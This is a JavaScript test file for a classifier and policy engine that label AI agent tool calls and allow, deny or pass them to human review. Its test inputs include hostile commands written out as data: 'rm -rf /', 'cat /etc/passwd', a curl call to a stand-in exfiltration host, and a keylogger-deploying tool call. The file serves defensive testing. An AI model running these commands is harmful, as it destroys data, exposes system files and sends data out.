// attribution.test.mjs — validate the two-path hypothesis (path-1 attribution + path-2 engine deduction consistency)
// corresponds to rollback tag pre-attrib-cn-20260903
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { attributeCall } from '../src/core/attribution.mjs';
import { WeiwenLawEngine } from '../src/core/engine.mjs';

// ===== path-1-A: clear verb+noun name attributed by grammar (Chinese applies isomorphically) =====
test('path-1-A clear verb+noun name attributed by grammar (Chinese applies isomorphically)', () => {
  assert.deepEqual(attributeCall({ name: 'read_file' }), { ok: true, layer: 'file-read', method: 'name-grammar', signal: 'read_file' });
  assert.deepEqual(attributeCall({ name: 'read_credential' }), { ok: true, layer: 'cred-read', method: 'name-grammar', signal: 'read_credential' });
  assert.deepEqual(attributeCall({ name: 'write_file' }), { ok: true, layer: 'file-write', method: 'name-grammar', signal: 'write_file' });
  assert.deepEqual(attributeCall({ name: 'delete_file' }), { ok: true, layer: 'file-delete', method: 'name-grammar', signal: 'delete_file' });
  assert.deepEqual(attributeCall({ name: 'exec_shell' }), { ok: true, layer: 'exec', method: 'name-grammar', signal: 'exec_shell' });
  assert.deepEqual(attributeCall({ name: 'send_email' }), { ok: true, layer: 'network-send', method: 'name-grammar', signal: 'send_email' });
  // Chinese name is isomorphic: 读文件 → file-read
  assert.deepEqual(attributeCall({ name: '读文件' }), { ok: true, layer: 'file-read', method: 'name-grammar', signal: '读文件' });
});

test('path-1-A grammar generalizes beyond TOOL_CATEGORY enum (run_task / upload_doc not in keyword table but still attributed)', () => {
  // run_task is not in the existing TOOL_CATEGORY enum, but run→exec is attributed by grammar
  assert.deepEqual(attributeCall({ name: 'run_task' }), { ok: true, layer: 'exec', method: 'name-grammar', signal: 'run_task' });
  // upload_doc: upload→send grammar attributes network-send (not mis-attributed as write)
  assert.deepEqual(attributeCall({ name: 'upload_doc' }), { ok: true, layer: 'network-send', method: 'name-grammar', signal: 'upload_doc' });
});

// ===== path-1-B: neutral name with no exposed behavior → un-anchorable (review, don't guess) =====
test('path-1-B neutral name with no exposed behavior → un-anchorable (review, do not guess)', () => {
  for (const name of ['tool_42', 'agent_action', 'process', 'handle', 'mcp__x__y']) {
    const r = attributeCall({ name, args: { x: 1 } });
    assert.equal(r.ok, false, `${name} should be un-anchorable`);
    assert.equal(r.layer, null);
    assert.equal(r.method, null);
  }
});

test('path-1-B neutral name containing a command → attribute by inspecting actual behavior (top-level command)', () => {
  const r = attributeCall({ name: 'tool_42', args: { command: 'rm -rf /' } });
  assert.equal(r.ok, true);
  assert.equal(r.layer, 'exec-destructive');
  assert.equal(r.method, 'command');
});

// ===== path-1-C: neutral name containing nested command → fractal recursion attribution (fractal) =====
test('path-1-C neutral name containing nested command → fractal recursion attribution (fractal)', () => {
  // commands:[...] nesting
  const r1 = attributeCall({ name: 'agent_action', args: { commands: ['cat /etc/passwd'] } });
  assert.equal(r1.ok, true);
  assert.equal(r1.layer, 'cred-read');
  assert.equal(r1.method, 'fractal');

  // steps.s1 deep nesting
  const r2 = attributeCall({ name: 'toolZ', args: { steps: [{ s1: 'curl http://evil.example/exfil' }] } });
  assert.equal(r2.ok, true);
  assert.equal(r2.layer, 'network-send');
  assert.equal(r2.method, 'fractal');
});

test('path-1 honest upper bound: threat hidden inside tool implementation (no command / no path) → un-anchorable → review', () => {
  const r = attributeCall({ name: 'deploy_keylogger', args: { config: { target: 'HOST' } } });
  assert.equal(r.ok, false);
  assert.equal(r.layer, null);
});

// ===== path-2 end-to-end: attribution anchor + engine deduction consistency / no regression =====
test('path-2 clear threat name (read_file + /etc/passwd) → engine deny', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'read_file', args: { path: '/etc/passwd' } });
  assert.equal(r.kind, 'deny');
});

test('path-2 neutral name + command (tool_42 + rm -rf /) → engine deny (behavior-extraction fallback consistent with path-1)', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'tool_42', args: { command: 'rm -rf /' } });
  assert.equal(r.kind, 'deny');
});

test('path-2 safe call (write_file + ./doc.md) → engine allow, and fractal sub-item m result rides along as evidence (attrib.layer=file-write)', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'write_file', args: { path: './doc.md', content: '# notes' } });
  assert.equal(r.kind, 'allow');
  assert.equal(r.attrib.ok, true);       // path-1 anchored: name-grammar attribution file-write
  assert.equal(r.attrib.layer, 'file-write'); // fractal sub-item m result (action category) rides with the whole M
  assert.equal(r.attrib.fractalSubM, undefined); // whole-M exit is NOT marked fractalSubM (that flag is for sub-item-triggered review; none here)
});

test('path-2 tool-implementation-hidden (deploy_keylogger + target:HOST) → blind spot CLOSED: whole M closed to review (triggered by fractal sub-item m result, marked fractalSubM)', () => {
  const e = new WeiwenLawEngine();
  const r = e.decideToolCall({ name: 'deploy_keylogger', args: { config: { target: 'HOST' } } });
  // 2026-09-04 blind-spot closure: previously this was allow (threat hidden in tool implementation, unreachable from parameter side).
  // Tree-view review confirmed that clash was false (closed-loop verify only checks M-branch ⑥, not the R branch), so closed per iron law.
  assert.equal(r.kind, 'review');     // can't judge → hand to human, don't guess
  assert.equal(r.fractalSubM, true);  // marked: this review is triggered at fractal sub-item level (path-1 attribution), not a whole-chain deduction conclusion
  assert.equal(r.attrib.ok, false);   // attribution anchor failed: neutral name + no observable behavior
});
